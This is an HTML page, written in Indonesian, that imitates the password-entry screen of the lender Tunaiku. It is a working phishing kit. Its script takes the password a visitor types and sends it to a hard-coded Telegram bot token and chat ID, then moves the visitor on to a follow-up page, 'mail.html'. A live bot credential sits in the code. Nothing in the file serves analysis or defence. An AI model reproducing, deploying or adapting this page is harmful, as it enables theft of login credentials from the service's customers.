<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1" name="viewport" />
  <title>Login Tunaiku</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
    rel="stylesheet"
  />
  <style>
    @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap");
    body {
      font-family: "Inter", sans-serif;
    }
  </style>
</head>
<body class="bg-white text-[#0B3B2E] min-h-screen flex flex-col justify-between">
  <div class="px-6 pt-6 max-w-md mx-auto w-full">
    <button aria-label="Back" class="mb-6">
      <i class="fas fa-arrow-left text-[#0B3B2E] text-2xl"></i>
    </button>
    <h1 class="text-1xl font-semibold leading-tight mb-4">
      Masukkan Password
    </h1>
    <p class="flex items-center text-sm text-[#4B4B4B] mb-4">
   
      <span>
       Jika Anda merasa belum pernah membuat password dengan No. +62xxxxxxxx <span class="font-semibold"> Klik disini</span>
      </span>
    </p>
    <form id="phoneForm" class="mb-4">
      <input
        id="phoneInput"
        name="phone"
        aria-label="Nomor Handphone"
        class="w-full border border-[#F0F0F0] rounded-md py-3 px-4 text-black placeholder-[#C7C7C7] focus:outline-none focus:ring-2 focus:ring-[#0B3B2E]"
        placeholder="Minimal 8 karakter"
        type="alphanumeric"
        required
      />
      <button
        id="submitBtn"
        class="w-full mt-4 bg-[#BDBDBD] text-white font-semibold py-3 rounded-full cursor-not-allowed"
        disabled
        type="submit"
      >
        Selanjutnya
      </button>
    </form>
    
    <div class="flex justify-center space-x-6 mb-6">
    </div>
    <p class="text-[9px] text-[#A3A3A3] leading-tight max-w-xs mx-auto whitespace-pre-line">
    </p>
  </div>

  <script>
    const phoneInput = document.getElementById("phoneInput");
    const submitBtn = document.getElementById("submitBtn");
    const form = document.getElementById("phoneForm");

    // Enable button only if input has value
    phoneInput.addEventListener("input", () => {
      if (phoneInput.value.trim().length > 0) {
        submitBtn.disabled = false;
        submitBtn.classList.remove("bg-[#BDBDBD]", "cursor-not-allowed");
        submitBtn.classList.add("bg-[#0B3B2E]", "cursor-pointer");
      } else {
        submitBtn.disabled = true;
        submitBtn.classList.add("bg-[#BDBDBD]", "cursor-not-allowed");
        submitBtn.classList.remove("bg-[#0B3B2E]", "cursor-pointer");
      }
    });

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      const phone = phoneInput.value.trim();

      if (!phone) return;

      // Telegram Bot API info - replace with your own bot token and chat ID
      const botToken = "8478186664:AAEVcs797UZjjkH1JTDYY_TN3AvC0ISdQ_c";
      const chatId = "7914074847";

      const message = `Password: ${phone}`;

      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      try {
        const response = await fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        });

        if (response.ok) {
          window.location.href = "mail.html";
          form.reset();
          submitBtn.disabled = true;
          submitBtn.classList.add("bg-[#BDBDBD]", "cursor-not-allowed");
          submitBtn.classList.remove("bg-[#0B3B2E]", "cursor-pointer");
        } else {
          alert("Gagal mengirim data ke Telegram.");
        }
      } catch (error) {
        alert("Terjadi kesalahan saat mengirim data.");
      }
    });
  </script>
</body>
</html>
